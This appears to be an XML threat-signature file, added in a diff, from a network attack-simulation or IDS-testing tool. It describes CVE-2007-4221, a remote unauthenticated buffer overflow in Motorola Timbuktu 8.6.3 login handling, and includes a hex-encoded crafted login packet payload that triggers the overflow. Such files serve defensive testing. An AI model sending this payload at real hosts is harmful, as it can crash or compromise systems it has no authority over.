@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Motorola Timbuktu Crafted Login Request Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a buffer overflow vulnerability in Motorola Timbuktu product. The vulnerability is due to lack of boundary protection when handling user login requests. A remote unauthenticated attacker can leverage this flaw to inject and execute arbitrary code on the target host with System level privileges. "/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="TCP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Motorola"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Motorola_Timbuktu"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Motorola_Timbuktu_8.6.3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20070827-11"/>
+    <CVEID display="true" value="CVE-2007-4221"/>
+    <bugtraqID display="true" value="25454"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="1f18c7f5364951adf1f55def73987a5a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633318999802270000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1204070177" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$destPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="0001000000B0002307414141414141414141414141414141414141414141FF61616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161FF41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141010101117A3AB34600010001AC100828454545454545454545454545" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="0101000000240023D0BB0000000000000000000000000000000000000000000000000000000000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
